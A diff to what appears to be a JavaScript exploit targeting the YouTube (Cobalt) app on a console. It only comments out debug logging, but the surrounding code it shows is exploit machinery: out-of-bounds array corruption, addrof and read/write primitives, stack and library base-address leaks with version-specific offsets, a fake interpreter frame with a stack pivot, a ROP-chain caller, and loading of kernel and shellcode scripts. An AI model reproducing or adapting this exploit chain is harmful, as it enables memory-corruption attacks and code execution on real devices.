@@ -211,7 +211,7 @@ function trigger() {
         //oob_arr[32] : 0xf -- victim_arr ExternalPointer_t 
         //oob_arr[33] : 0x27e8412d1 -- victm_arr base_pointer
 
-        await log("oob_arr length : " + toHex(oob_arr.length));
+        //await log("oob_arr length : " + toHex(oob_arr.length));
 
         const oob_arr_before = [];
         for (let i = 0; i < 100; i++) {
@@ -721,10 +721,10 @@ function trigger() {
         write64(bc_start, 0xAB0025n);
 
         const stack_addr = addrof(pwn(1)) + 0x1n;
-        await log("Stack leak @ " + toHex(stack_addr));
+        //await log("Stack leak @ " + toHex(stack_addr));
 
         const text_leak = read64(stack_addr + 0x8n);
-        await log("Text leak @ " + toHex(text_leak));
+        //await log("Text leak @ " + toHex(text_leak));
         const text_leak_mask = text_leak & 0xFFFn;
 
         if (text_leak_mask == 0x81Fn) {
@@ -746,13 +746,13 @@ function trigger() {
             ROP = ROP_1220;
 
             libcobalt_base = read64(stack_addr + 0x8n) - Y2_OFFSET.LIBCOBALT_LEAK;
-            await log("libcobalt_base @ " + toHex(libcobalt_base));
+            //await log("libcobalt_base @ " + toHex(libcobalt_base));
 
             libstarboard_base = read64(libcobalt_base + Y2_OFFSET.LIBSTARBOARD_LEAK1) - Y2_OFFSET.LIBSTARBOARD_LEAK2;
-            await log("libstarboard_base @ " + toHex(libstarboard_base));
+            //await log("libstarboard_base @ " + toHex(libstarboard_base));
 
             libc_base = read64(libstarboard_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
-            await log("libc_base @ " + toHex(libc_base));
+            //await log("libc_base @ " + toHex(libc_base));
 
         } else if (text_leak_mask == 0x73fn) {
             Y2_VERSION = "01.009.202 (min fw 13.20)";
@@ -761,19 +761,19 @@ function trigger() {
             ROP = ROP_1320;
 
             libcobalt_base = read64(stack_addr + 0x8n) - Y2_OFFSET.LIBCOBALT_LEAK;
-            await log("libcobalt_base @ " + toHex(libcobalt_base));
+            //await log("libcobalt_base @ " + toHex(libcobalt_base));
 
             libstarboard_base = read64(libcobalt_base + Y2_OFFSET.LIBSTARBOARD_LEAK1) - Y2_OFFSET.LIBSTARBOARD_LEAK2;
-            await log("libstarboard_base @ " + toHex(libstarboard_base));
+            //await log("libstarboard_base @ " + toHex(libstarboard_base));
 
             libc_base = read64(libstarboard_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
-            await log("libc_base @ " + toHex(libc_base));
+            //await log("libc_base @ " + toHex(libc_base));
         } else {
             throw new Error("UNSUPPORTED YOUTUBE VERSION");
         }
 
         const rop_chain_addr = get_backing_store(rop_chain);
-        await log("ROP chain @ " + toHex(rop_chain_addr));
+        //await log("ROP chain @ " + toHex(rop_chain_addr));
 
         // Fake bytecode for r14 register
         fake_bc[0] = 0xABn; // Return opcode - keeps interpreter happy
@@ -793,7 +793,7 @@ function trigger() {
         write64(fake_frame_addr + 0x9n, ROP.pop_rsp); // pop rsp ; ret
         write64(fake_frame_addr + 0x9n + Y2_OFFSET.RSP_OFFSET, rop_chain_addr);
 
-        await log("fake_frame_addr @ " + toHex(fake_frame_addr));
+        //await log("fake_frame_addr @ " + toHex(fake_frame_addr));
 
         call_rop = function (address, rax = 0x0n, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
             let rop_i = 0;
@@ -852,7 +852,7 @@ function trigger() {
             return return_value_buf[0];
         }
 
-        await log("ROP test, should see 0x0000000200000000");
+        //await log("ROP test, should see 0x0000000200000000");
 
         rop_test = call(ROP.mov_rax_0x200000000);
         await log(toHex(rop_test));
@@ -1030,13 +1030,13 @@ function trigger() {
         }
 
         send_notification(version_string + "\nFW : " + FW_VERSION + "\nTitle ID : " + TITLE_ID + "\nAppVer : " + Y2_VERSION);
-        await log("FW detected : " + FW_VERSION);
-        await log("Title ID detected : " + TITLE_ID);
-        await log("AppVer detected : " + Y2_VERSION);
+        //await log("FW detected : " + FW_VERSION);
+        //await log("Title ID detected : " + TITLE_ID);
+        //await log("AppVer detected : " + Y2_VERSION);
         await log("FW : " + FW_VERSION + "  Title ID : " + TITLE_ID);
         await log("AppVer : " + Y2_VERSION);
 
-        await log("libkernel_base @ " + toHex(libkernel_base));
+        //await log("libkernel_base @ " + toHex(libkernel_base));
 
         await load_localscript('kernel.js');
         await load_localscript('aioshellcode.js');
